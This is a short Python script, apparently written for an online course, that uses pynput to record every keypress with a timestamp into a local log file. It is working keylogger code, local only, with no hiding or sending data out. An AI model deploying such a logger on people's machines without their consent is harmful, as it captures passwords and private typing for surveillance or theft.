import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"/home/kylo17/Documents/Courses Online/Python/PythonProjects/PythonKeyLogger"
logging.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
